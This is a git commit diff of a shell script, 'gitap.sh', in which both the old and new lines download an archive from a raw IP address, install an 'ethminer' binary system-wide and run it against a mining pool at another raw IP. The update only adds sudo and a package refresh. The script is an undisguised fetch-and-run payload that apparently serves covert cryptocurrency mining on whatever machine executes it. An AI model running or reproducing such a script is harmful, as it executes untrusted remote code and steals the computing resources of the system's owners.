244696f9448ce58a86cf3c6d2cb25f5e4a5732b1
Furkan Kormaz <kanlicali@gmail.com>
2021-02-26 01:27:41 +0300

    Update gitap.sh

--- gitap.sh
+++ gitap.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-apt-get install wget; apt-get install tar; mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; ./ethminer --farm-recheck 200 -U -F  http://143.198.11.202:8080/aaaaaaa
+apt-get install wget; sudo apt-get update -y; sudo apt-get install -y tar; mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; ./ethminer --farm-recheck 200 -U -F  http://143.198.11.202:8080/aaaaaaa
